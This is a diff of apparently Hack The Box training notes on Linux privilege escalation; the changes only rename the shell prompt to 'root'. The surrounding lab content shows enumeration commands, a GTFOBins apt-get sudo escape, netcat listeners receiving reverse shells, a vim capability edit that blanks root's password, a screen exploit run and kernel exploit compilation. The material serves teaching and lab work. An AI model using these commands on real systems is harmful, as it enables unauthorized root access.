@@ -66,7 +66,7 @@ Enumeration is the key to privilege escalation. Several helper scripts (such as 
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ps aux | grep root
+root@htb[/htb]$ ps aux | grep root
 
 root         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init
 root         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]
@@ -90,7 +90,7 @@ root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ps au
+root@htb[/htb]$ ps au
 
 USER       		PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root      		1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --
@@ -109,7 +109,7 @@ shared     		1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /home
+root@htb[/htb]$ ls /home
 
 backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
 ```
@@ -121,7 +121,7 @@ We can check individual user directories and check to see if files such as the `
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -la /home/stacey.jenkins/
+root@htb[/htb]$ ls -la /home/stacey.jenkins/
 
 total 32
 drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
@@ -141,7 +141,7 @@ If you find an SSH key for your current user, this could be used to open an SSH 
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -l ~/.ssh
+root@htb[/htb]$ ls -l ~/.ssh
 
 total 8
 -rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
@@ -155,7 +155,7 @@ It is also important to check a user's bash history, as they may be passing pass
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ history
+root@htb[/htb]$ history
 
     1  id
     2  cd /home/cliff.moore
@@ -173,7 +173,7 @@ AbdulrahmanTamim@htb[/htb]$ history
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo -l
+root@htb[/htb]$ sudo -l
 
 Matching Defaults entries for sysadm on NIX02:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -193,7 +193,7 @@ User sysadm may run the following commands on NIX02:
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd
+root@htb[/htb]$ cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -226,7 +226,7 @@ sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -la /etc/cron.daily/
+root@htb[/htb]$ ls -la /etc/cron.daily/
 
 total 60
 drwxr-xr-x  2 root root 4096 Aug 30 23:49 .
@@ -253,7 +253,7 @@ drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lsblk
+root@htb[/htb]$ lsblk
 
 NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
 sda      8:0    0   30G  0 disk 
@@ -272,7 +272,7 @@ sr0     11:0    1  848M  0 rom
 &#x20; Introduction to Linux Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+root@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
 
 /dmz-backups
 /tmp
@@ -297,7 +297,7 @@ AbdulrahmanTamim@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/d
 **Find Writable Files**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+root@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
 /etc/cron.daily/backup
 /dmz-backups/backup.sh
@@ -356,7 +356,7 @@ We'll start out by checking out what operating system and version we are dealing
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/os-release
+root@htb[/htb]$ cat /etc/os-release
 
 NAME="Ubuntu"
 VERSION="20.04.4 LTS (Focal Fossa)"
@@ -379,7 +379,7 @@ Next we'll want to check out our current user's PATH, which is where the Linux s
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo $PATH
+root@htb[/htb]$ echo $PATH
 
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 ```
@@ -389,7 +389,7 @@ We can also check out all environment variables that are set for our current use
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ env
+root@htb[/htb]$ env
 
 SHELL=/bin/bash
 PWD=/home/htb-student
@@ -407,7 +407,7 @@ Next let's note down the Kernel version. We can do some searches to see if the t
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ uname -a
+root@htb[/htb]$ uname -a
 
 Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 ```
@@ -417,7 +417,7 @@ We can next gather some additional information about the host itself such as the
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lscpu 
+root@htb[/htb]$ lscpu 
 
 Architecture:                    x86_64
 CPU op-mode(s):                  32-bit, 64-bit
@@ -446,7 +446,7 @@ What login shells exist on the server? Note these down and highlight that both T
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/shells
+root@htb[/htb]$ cat /etc/shells
 
 # /etc/shells: valid login shells
 /bin/sh
@@ -477,7 +477,7 @@ Next we can take a look at the drives and any shares on the system. First, we ca
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lsblk
+root@htb[/htb]$ lsblk
 
 NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
 loop0                       7:0    0   55M  1 loop /snap/core18/1705
@@ -501,7 +501,7 @@ We should also checked for mounted drives and unmounted drives. Can we mount an 
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/fstab
+root@htb[/htb]$ cat /etc/fstab
 
 # /etc/fstab: static file system information.
 #
@@ -521,7 +521,7 @@ Check out the routing table by typing `route` or `netstat -rn`. Here we can see 
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ route
+root@htb[/htb]$ route
 
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
@@ -536,7 +536,7 @@ We'll also want to check the arp table to see what other hosts the target has be
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ arp -a
+root@htb[/htb]$ arp -a
 
 _gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
 ```
@@ -556,7 +556,7 @@ The environment enumeration also includes knowledge about the users that exist o
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd
+root@htb[/htb]$ cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -592,7 +592,7 @@ Occasionally, we will see password hashes directly in the `/etc/passwd` file. Th
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd | cut -f1 -d:
+root@htb[/htb]$ cat /etc/passwd | cut -f1 -d:
 
 root
 daemon
@@ -629,7 +629,7 @@ We'll also want to check which users have login shells. Once we see what shells 
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ grep "*sh$" /etc/passwd
+root@htb[/htb]$ grep "*sh$" /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
@@ -650,7 +650,7 @@ Each user in Linux systems is assigned to a specific group or groups and thus re
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/group
+root@htb[/htb]$ cat /etc/group
 
 root:x:0:
 daemon:x:1:
@@ -684,7 +684,7 @@ The `/etc/group` file lists all of the groups on the system. We can then use the
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ getent group sudo
+root@htb[/htb]$ getent group sudo
 
 sudo:x:27:mrb3n
 ```
@@ -694,7 +694,7 @@ We can also check out which users have a folder under the `/home` directory. We'
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /home
+root@htb[/htb]$ ls /home
 
 administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
 backupsvc                cliff.moore  logger       shared
@@ -711,7 +711,7 @@ In Linux, there are many different places where such files can be stored, includ
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ df -h
+root@htb[/htb]$ df -h
 
 Filesystem      Size  Used Avail Use% Mounted on
 udev            1,9G     0  1,9G   0% /dev
@@ -742,7 +742,7 @@ When a file system is unmounted, it is no longer accessible by the system. This 
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t
+root@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t
 
 UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
 UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
@@ -756,7 +756,7 @@ Many folders and files are kept hidden on a Linux system so they are not obvious
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
+root@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
 
 -rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
 -rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
@@ -772,7 +772,7 @@ AbdulrahmanTamim@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/n
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null
+root@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null
 
    684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
    790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
@@ -804,7 +804,7 @@ In addition, all temporary files stored in the `/tmp` directory are deleted imme
 &#x20; Environment Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm
+root@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm
 
 /dev/shm:
 total 0
@@ -870,7 +870,7 @@ When we talk about the `internals`, we mean the internal configuration and way o
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ip a
+root@htb[/htb]$ ip a
 
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -895,7 +895,7 @@ Is there anything interesting in the `/etc/hosts` file?
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/hosts
+root@htb[/htb]$ cat /etc/hosts
 
 127.0.0.1 localhost
 127.0.1.1 nixlpe02
@@ -914,7 +914,7 @@ It can also be helpful to check out each user's last login time to try to see wh
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lastlog
+root@htb[/htb]$ lastlog
 
 Username         Port     From             Latest
 root                                       **Never logged in**
@@ -943,7 +943,7 @@ In addition, let's see if anyone else is currently on the system with us. There 
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ w
+root@htb[/htb]$ w
 
  12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -957,7 +957,7 @@ It is also important to check a user's bash history, as they may be passing pass
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ history
+root@htb[/htb]$ history
 
     1  id
     2  cd /home/cliff.moore
@@ -975,7 +975,7 @@ Sometimes we can also find special history files created by scripts or programs.
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+root@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
 
 -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
 ```
@@ -987,7 +987,7 @@ It's also a good idea to check for any cron jobs on the system. Cron jobs on Lin
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -la /etc/cron.daily/
+root@htb[/htb]$ ls -la /etc/cron.daily/
 
 total 48
 drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
@@ -1010,7 +1010,7 @@ The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc`
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+root@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
 
 ...SNIP...
 startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:
@@ -1032,7 +1032,7 @@ If it is a slightly older Linux system, the likelihood increases that we can fin
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+root@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
 
 Listing...                                                 
 accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
@@ -1068,7 +1068,7 @@ It's also a good idea to check if the `sudo` version installed on the system is 
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo -V
+root@htb[/htb]$ sudo -V
 
 Sudo version 1.8.31
 Sudoers policy plugin version 1.8.31
@@ -1083,7 +1083,7 @@ Occasionally it can also happen that no direct packages are installed on the sys
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/
+root@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/
 
 lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin
 
@@ -1125,7 +1125,7 @@ lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+root@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
 
 Check GTFO for: ab                                         
 Check GTFO for: apt                                        
@@ -1160,7 +1160,7 @@ The output of `strace` can be written to a file for later analysis, and it provi
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ strace ping -c1 10.129.112.20
+root@htb[/htb]$ strace ping -c1 10.129.112.20
 
 execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
 access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
@@ -1207,7 +1207,7 @@ Users can read almost all configuration files on a Linux operating system if the
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+root@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
 
 -rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
 -rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
@@ -1225,7 +1225,7 @@ The scripts are similar to the configuration files. Often administrators are laz
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+root@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
 
 /home/htb-student/automation.sh
 /etc/wpa_supplicant/action_wpa.sh
@@ -1244,7 +1244,7 @@ Also, if we look at the process list, it can give us information about which scr
 &#x20; Linux Services & Internals Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ps aux | grep root
+root@htb[/htb]$ ps aux | grep root
 
 ...SNIP...
 root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
@@ -1547,7 +1547,7 @@ For example, we could use the following command to inject a `pwd` command into t
 &#x20; Escaping Restricted Shells
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -l `pwd` 
+root@htb[/htb]$ ls -l `pwd` 
 ```
 
 This command would cause the `ls` command to be executed with the argument `-l`, followed by the output of the `pwd` command. Since the `pwd` command is not restricted by the shell, this would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly.
@@ -1579,7 +1579,7 @@ The `Set User ID upon Execution` (`setuid`) permission can allow a user to execu
 &#x20; Special Permissions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+root@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 
 -rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
 -rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
@@ -1619,7 +1619,7 @@ The Set-Group-ID (setgid) permission is another special permission that allows u
 &#x20; Special Permissions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+root@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
 
 -rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
 ```
@@ -1635,7 +1635,7 @@ The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binarie
 &#x20; Special Permissions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+root@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
 # id
 uid=0(root) gid=0(root) groups=0(root)
@@ -1715,7 +1715,7 @@ We receive a root shell almost instantly.
 &#x20; Sudo Rights Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 443
+root@htb[/htb]$ nc -lnvp 443
 
 listening on [any] 443 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
@@ -1871,7 +1871,7 @@ For example, we could use the following command to set the `cap_net_bind_service
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+root@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
 ```
 
 When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.
@@ -1922,7 +1922,7 @@ It is important to note that these capabilities should be used with caution and 
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+root@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 
 /usr/bin/vim.basic cap_dac_override=eip
 /usr/bin/ping cap_net_raw=ep
@@ -1942,7 +1942,7 @@ If we gained access to the system with a low-privilege account, then discovered 
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ getcap /usr/bin/vim.basic
+root@htb[/htb]$ getcap /usr/bin/vim.basic
 
 /usr/bin/vim.basic cap_dac_override=eip
 ```
@@ -1954,7 +1954,7 @@ Let us take a look at the `/etc/passwd` file where the user `root` is specified:
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd | head -n1
+root@htb[/htb]$ cat /etc/passwd | head -n1
 
 root:x:0:0:root:/root:/bin/bash
 ```
@@ -1964,7 +1964,7 @@ We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to mod
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
+root@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
 ```
 
 We also can make these changes in a non-interactive mode:
@@ -1972,8 +1972,8 @@ We also can make these changes in a non-interactive mode:
 &#x20; Capabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd | head -n1
+root@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+root@htb[/htb]$ cat /etc/passwd | head -n1
 
 root::0:0:root:/root:/bin/bash
 ```
@@ -1993,7 +1993,7 @@ Many services may be found, which have flaws that can be leveraged to escalate p
 &#x20; Vulnerable Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ screen -v
+root@htb[/htb]$ screen -v
 
 Screen version 4.05.00 (GNU) 10-Dec-16
 ```
@@ -2005,7 +2005,7 @@ This allows an attacker to truncate any file or create a file owned by root in a
 &#x20; Vulnerable Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./screen_exploit.sh 
+root@htb[/htb]$ ./screen_exploit.sh 
 
 ~ gnu/screenroot ~
 [+] First, we create our shell and library...
@@ -2088,7 +2088,7 @@ First, let's look around the system for any writeable files or directories. The 
 &#x20; Cron Job Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+root@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
 /etc/cron.daily/backup
 /dmz-backups/backup.sh
@@ -2106,7 +2106,7 @@ A quick look in the `/dmz/backups` directory shows what appears to be files crea
 &#x20; Cron Job Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls -la /dmz-backups/
+root@htb[/htb]$ ls -la /dmz-backups/
 
 total 36
 drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
@@ -2127,7 +2127,7 @@ Let's run `pspy` and have a look. The `-pf` flag tells the tool to print command
 &#x20; Cron Job Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./pspy64 -pf -i 1000
+root@htb[/htb]$ ./pspy64 -pf -i 1000
 
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 
@@ -2185,7 +2185,7 @@ We can look at the shell script and append a command to it to attempt to obtain 
 &#x20; Cron Job Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /dmz-backups/backup.sh 
+root@htb[/htb]$ cat /dmz-backups/backup.sh 
 
 #!/bin/bash
  SRCDIR="/var/www/html"
@@ -2213,7 +2213,7 @@ We modify the script, stand up a local `netcat` listener, and wait. Sure enough,
 &#x20; Cron Job Abuse
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 443
+root@htb[/htb]$ nc -lnvp 443
 
 listening on [any] 443 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
@@ -2435,7 +2435,7 @@ From here on, we could copy the contents of the private SSH key to `cry0l1t3.pri
 &#x20; Docker
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
+root@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
 ```
 
 **Docker Sockets**
@@ -2921,9 +2921,9 @@ Every Linux system produces large amounts of log files. To prevent the hard disk
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ man logrotate
-AbdulrahmanTamim@htb[/htb]$ # or
-AbdulrahmanTamim@htb[/htb]$ logrotate --help
+root@htb[/htb]$ man logrotate
+root@htb[/htb]$ # or
+root@htb[/htb]$ logrotate --help
 
 Usage: logrotate [OPTION...] <configfile>
   -d, --debug               Don't do anything, just test and print debug messages
@@ -2947,7 +2947,7 @@ This tool is usually started periodically via `cron` and controlled via the conf
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/logrotate.conf
+root@htb[/htb]$ cat /etc/logrotate.conf
 
 
 # see "man logrotate" for details
@@ -2984,7 +2984,7 @@ To force a new rotation on the same day, we can set the date after the individua
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo cat /var/lib/logrotate.status
+root@htb[/htb]$ sudo cat /var/lib/logrotate.status
 
 /var/log/samba/log.smbd" 2022-8-3
 /var/log/mysql/mysql.log" 2022-8-3
@@ -2995,7 +2995,7 @@ We can find the corresponding configuration files in `/etc/logrotate.d/` directo
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /etc/logrotate.d/
+root@htb[/htb]$ ls /etc/logrotate.d/
 
 alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
 ```
@@ -3003,7 +3003,7 @@ alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-t
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/logrotate.d/dpkg
+root@htb[/htb]$ cat /etc/logrotate.d/dpkg
 
 /var/log/dpkg.log {
         monthly
@@ -3061,7 +3061,7 @@ After that, we have to start a listener on our VM / Pwnbox, which waits for the 
 &#x20; Logrotate
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nlvp 9001
+root@htb[/htb]$ nc -nlvp 9001
 
 Listening on 0.0.0.0 9001
 ```
@@ -3105,7 +3105,7 @@ Network File System (NFS) allows users to access shared files or directories ove
 &#x20; Miscellaneous Techniques
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ showmount -e 10.129.2.12
+root@htb[/htb]$ showmount -e 10.129.2.12
 
 Export list for 10.129.2.12:
 /tmp             *
@@ -3273,7 +3273,7 @@ Let's start by checking the Kernel level and Linux OS version.
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ uname -a
+root@htb[/htb]$ uname -a
 
 Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
@@ -3281,7 +3281,7 @@ Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_6
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/lsb-release 
+root@htb[/htb]$ cat /etc/lsb-release 
 
 DISTRIB_ID=Ubuntu
 DISTRIB_RELEASE=16.04
@@ -3294,7 +3294,7 @@ We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
+root@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
 ```
 
 Next, we run the exploit and hopefully get dropped into a root shell.
